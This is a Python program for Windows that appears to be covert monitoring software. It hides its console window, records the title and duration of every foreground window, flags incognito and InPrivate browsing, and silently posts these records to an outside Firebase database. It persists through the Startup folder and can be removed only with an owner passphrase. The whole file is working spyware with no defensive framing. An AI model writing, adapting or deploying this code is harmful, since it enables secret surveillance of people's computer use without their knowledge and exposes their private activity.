import ctypes
import time
import os
import sys
import json
import urllib.request
from datetime import datetime

# =======================================================
# 🔑 FIREBASE CONFIGURATION BINDINGS
# =======================================================
FIREBASE_DB_URL = "https://system-wellbeing-hub-rtdb.firebaseio.com"
UNINSTALL_KEY = "##@@!!owner0813!!@@##"

user32 = ctypes.windll.user32

def get_active_window_title():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    if length > 0:
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    return "Idle System Desktop"

def dispatch_to_firebase(app_name, duration_secs, private_session):
    if "YOUR_PROJECT_ID" in FIREBASE_DB_URL:
        return 
    
    endpoint = f"{FIREBASE_DB_URL}/telemetry.json"
    
    # Generate ISO format timestamp mapping exactly to the current server runtime context
    timestamp_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    
    payload = {
        "device": "Windows PC",
        "application": app_name,
        "duration": int(duration_secs),
        "is_private": bool(private_session),
        "timestamp": timestamp_iso
    }
    
    try:
        req = urllib.request.Request(
            endpoint,
            data=json.dumps(payload).encode('utf-8'),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req) as response:
            pass
    except Exception:
        pass

def run_telemetry_loop():
    last_window = ""
    start_time = time.time()

    while True:
        try:
            current_window = get_active_window_title()
            if current_window != last_window:
                end_time = time.time()
                duration = round(end_time - start_time)
                
                if last_window and duration > 1:
                    is_incognito = "Incognito" in last_window or "InPrivate" in last_window
                    dispatch_to_firebase(last_window, duration, is_incognito)
                        
                last_window = current_window
                start_time = time.time()
                
            time.sleep(1)
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--uninstall":
        verification = input("Enter Owner Passphrase to remove tracking module: ")
        if verification == UNINSTALL_KEY:
            try:
                startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup\tracker.exe")
                if os.path.exists(startup_path): os.remove(startup_path)
                print("[SUCCESS]: Tracking node uninstalled correctly."); sys.exit(0)
            except Exception as e: print(f"Error: {e}"); sys.exit(1)
        else:
            print("Access Denied."); sys.exit(1)

    console_window = ctypes.windll.kernel32.GetConsoleWindow()
    if console_window != 0: ctypes.windll.user32.ShowWindow(console_window, 0)
    run_telemetry_loop()
